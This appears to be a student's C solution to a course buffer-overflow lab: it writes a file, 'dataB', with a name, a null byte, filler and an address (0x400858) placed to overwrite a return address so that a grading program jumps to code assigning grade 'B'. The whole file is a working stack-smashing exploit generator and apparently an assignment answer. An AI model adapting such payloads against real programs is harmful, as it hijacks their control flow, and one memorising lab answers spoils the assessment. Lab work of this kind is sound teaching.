#include <stdio.h>

int main(void)
{
    FILE *psFile;
    unsigned long ulData;

    ulData = 0x400858; /* address of grade = 'B'; */
    psFile = fopen("dataB", "w");

    /* buf[0 - 17] */
    fprintf(psFile, "Maxwell and Melody");
    /* buf[18] */
    fprintf(psFile, "%c", '\0');
    /* buf[19-47] */
    fprintf(psFile, "fillerfillerfillerfillerfille");
    /* buf[48-55] (x30) */
    fwrite(&ulData, sizeof(unsigned long), 1, psFile);
    /* buf[56] (newline in unused memory) */
    fprintf(psFile, "%c", '\n');
    return 0;
}